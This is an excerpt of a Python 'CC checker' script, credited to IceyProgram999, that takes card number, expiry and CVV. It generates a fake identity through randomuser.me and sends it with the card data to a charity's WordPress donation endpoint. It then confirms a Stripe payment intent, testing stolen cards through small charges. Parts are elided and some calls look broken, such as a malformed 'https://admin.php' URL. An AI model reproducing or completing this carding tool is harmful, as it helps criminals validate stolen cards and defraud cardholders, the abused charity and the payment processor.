...
def funct(cc, mm, yy, cvv,):
 ...
 response1 = request.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
 ...
 Guid=str(request.post('https://admin.php',headers=head1,cookies=cookies2).text)
 Muid=str(uuid.uuid1())
 Sid=str(uuid.uuid1())
 print('[-] Guid : '+Guid)
 print('[-] Muid : '+Muid)
 ...
 'info': {'name':str(fullname),'email':str(email)},
 } 

 response3 = request.post('https://elevatedbygrace.org/wp-admin/admin-matty.php',data=data3,cookies=cookies3)
 amir=response3.json()
 ...
 response4 = request.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
...
print('Reloaded CC Checker Tool by IceyProgram999')
